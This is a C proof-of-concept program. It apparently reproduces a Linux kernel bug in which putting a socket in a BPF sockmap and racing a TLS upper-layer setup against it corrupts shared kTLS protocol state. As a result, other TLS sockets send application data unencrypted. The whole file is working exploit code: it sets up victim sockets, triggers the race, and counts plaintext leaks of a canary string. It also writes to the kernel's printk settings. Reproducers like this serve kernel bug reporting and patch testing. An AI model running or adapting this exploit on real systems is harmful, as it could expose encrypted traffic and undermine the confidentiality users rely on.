// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <linux/bpf.h>
#include <linux/tls.h>

#ifndef SOL_TCP
#define SOL_TCP 6
#endif
#ifndef SOL_TLS
#define SOL_TLS 282
#endif
#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#define NVICTIM   8
#define ROUNDS    3

#define MARKER    "PLAINTEXT-LEAK-CANARY-0123456789"
#define MARKLEN   (sizeof(MARKER) - 1)

static int victim[NVICTIM], vpeer[NVICTIM];
static int arm_sk = -1, arm_peer = -1;
static int mapfd = -1;

static void loud_printk(void)
{
	int fd = open("/proc/sys/kernel/printk", O_WRONLY);

	if (fd >= 0) {
		write(fd, "7 4 1 7\n", 8);
		close(fd);
	}
}

static long bpf_(int cmd, union bpf_attr *attr, unsigned int size)
{
	return syscall(__NR_bpf, cmd, attr, size);
}

static int tcp_pair(int *cli, int *srv)
{
	struct sockaddr_in sa;
	socklen_t sl = sizeof(sa);
	int l, c, s, one = 1;

	l = socket(AF_INET, SOCK_STREAM, 0);
	if (l < 0)
		return -1;
	setsockopt(l, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	sa.sin_port = 0;
	if (bind(l, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -1;
	if (listen(l, 16) < 0)
		return -1;
	if (getsockname(l, (struct sockaddr *)&sa, &sl) < 0)
		return -1;
	c = socket(AF_INET, SOCK_STREAM, 0);
	if (c < 0)
		return -1;
	if (connect(c, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -1;
	s = accept(l, NULL, NULL);
	if (s < 0)
		return -1;
	close(l);
	*cli = c;
	*srv = s;
	return 0;
}

static int make_ktls_tx(int fd)
{
	struct tls12_crypto_info_aes_gcm_128 ci;

	if (setsockopt(fd, SOL_TCP, TCP_ULP, "tls", 4) < 0)
		return -1;

	memset(&ci, 0, sizeof(ci));
	ci.info.version = TLS_1_2_VERSION;
	ci.info.cipher_type = TLS_CIPHER_AES_GCM_128;
	memset(ci.iv, 0x11, sizeof(ci.iv));
	memset(ci.key, 0x22, sizeof(ci.key));
	memset(ci.salt, 0x33, sizeof(ci.salt));
	memset(ci.rec_seq, 0x00, sizeof(ci.rec_seq));

	return setsockopt(fd, SOL_TLS, TLS_TX, &ci, sizeof(ci));
}

static int make_sockmap(void)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_type = BPF_MAP_TYPE_SOCKMAP;
	attr.key_size = 4;
	attr.value_size = 4;
	attr.max_entries = 16;
	return (int)bpf_(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int sockmap_add(int map, unsigned int key, int fd)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_fd = map;
	attr.key = (unsigned long)&key;
	attr.value = (unsigned long)&fd;
	attr.flags = BPF_ANY;
	return (int)bpf_(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int arm_rc = -1;

static void *arm_thread(void *arg)
{
	arm_rc = setsockopt(arm_sk, SOL_TCP, TCP_ULP, "tls", 4);
	printf("[*]   arm: setsockopt(TCP_ULP,\"tls\") on sockmapped sk -> %d (%s)\n",
	       arm_rc, arm_rc ? strerror(errno) : "ok");
	return NULL;
}

static int peer_got_plaintext(int p)
{
	static char b[8192];
	struct pollfd pfd;
	int n;

	memset(&pfd, 0, sizeof(pfd));
	pfd.fd = p;
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 500) <= 0)
		return 0;
	n = recv(p, b, sizeof(b) - 1, MSG_DONTWAIT);
	if (n <= 0)
		return 0;
	b[n] = 0;
	return memmem(b, n, MARKER, MARKLEN) != NULL;
}

int main(void)
{
	int round, i, leaked_total = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	loud_printk();

	printf("[*] net/tls global tls_prots[] corruption PoC "
	       "(transient plaintext exposure)\n");

	mapfd = make_sockmap();
	if (mapfd < 0) {
		printf("[-] BPF_MAP_CREATE(SOCKMAP) failed: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] sockmap fd = %d\n", mapfd);

	for (round = 0; round < ROUNDS; round++) {
		pthread_t th;
		int leaked = 0, baseline_bad = 0;

		printf("[*] === round %d ===\n", round);

		for (i = 0; i < NVICTIM; i++) {
			victim[i] = vpeer[i] = -1;
			if (tcp_pair(&victim[i], &vpeer[i]) < 0) {
				printf("[-] tcp_pair(victim) failed: %s\n", strerror(errno));
				return 1;
			}
			if (make_ktls_tx(victim[i]) < 0) {
				printf("[-] kTLS setup on victim failed: %s\n", strerror(errno));
				return 1;
			}
		}
		printf("[+]   %d kTLS(TLS_SW tx) victims live "
		       "(sk_prot -> tls_prots[])\n", NVICTIM);

		for (i = 0; i < NVICTIM; i++)
			send(victim[i], MARKER, MARKLEN, MSG_NOSIGNAL);
		for (i = 0; i < NVICTIM; i++)
			if (peer_got_plaintext(vpeer[i]))
				baseline_bad++;
		printf("[%c]   baseline: %d/%d victims sent plaintext "
		       "(expected 0)\n", baseline_bad ? '-' : '+',
		       baseline_bad, NVICTIM);

		if (tcp_pair(&arm_sk, &arm_peer) < 0) {
			printf("[-] tcp_pair(arm) failed: %s\n", strerror(errno));
			return 1;
		}
		if (sockmap_add(mapfd, 0, arm_sk) < 0) {
			printf("[-] sockmap update failed: %s\n", strerror(errno));
			return 1;
		}
		printf("[+]   arm socket inserted into sockmap "
		       "(sk_prot = &tcp_bpf_prots[..])\n");

		pthread_create(&th, NULL, arm_thread, NULL);
		usleep(120000);

		for (i = 0; i < NVICTIM; i++)
			send(victim[i], MARKER, MARKLEN, MSG_NOSIGNAL);

		pthread_join(th, NULL);

		for (i = 0; i < NVICTIM; i++)
			if (peer_got_plaintext(vpeer[i]))
				leaked++;
		printf("[%c]   %d/%d victims transmitted APPLICATION PLAINTEXT\n",
		       leaked ? '+' : '-', leaked, NVICTIM);
		leaked_total += leaked;

		for (i = 0; i < NVICTIM; i++) {
			close(victim[i]);
			close(vpeer[i]);
		}
		close(arm_sk);
		close(arm_peer);
		arm_sk = arm_peer = -1;
	}

	printf("[*] done, %d/%d plaintext leaks total\n",
	       leaked_total, NVICTIM * ROUNDS);
	return leaked_total ? 2 : 0;
}
